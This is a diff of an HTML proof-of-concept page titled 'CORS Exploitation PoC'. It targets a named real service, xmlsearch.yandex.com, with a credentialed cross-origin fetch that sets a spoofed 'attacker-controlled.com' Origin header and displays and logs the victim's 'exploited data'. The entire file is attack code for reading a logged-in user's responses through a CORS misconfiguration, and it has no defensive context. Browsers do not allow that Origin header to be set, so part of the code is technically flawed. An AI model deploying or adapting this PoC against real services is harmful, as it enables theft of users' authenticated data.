@@ -1,14 +1,30 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CORS Exploitation PoC</title>
+</head>
 <body>
+    <h1>CORS Exploitation PoC</h1>
+    <button onclick="exploit()">Exploit</button>
+    <pre id="response"></pre>
     <script>
-        fetch('https://xmlsearch.yandex.com', {
-            method: 'GET',
-            credentials: 'include'
-        })
-        .then(response => response.text())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error:', error));
+        function exploit() {
+            fetch('https://xmlsearch.yandex.com', {
+                method: 'GET',
+                credentials: 'include',
+                headers: {
+                    'Origin': 'https://attacker-controlled.com'
+                }
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('response').textContent = data;
+                console.log('Exploited data:', data);
+            })
+            .catch(err => console.error('Exploit failed:', err));
+        }
     </script>
 </body>
 </html>
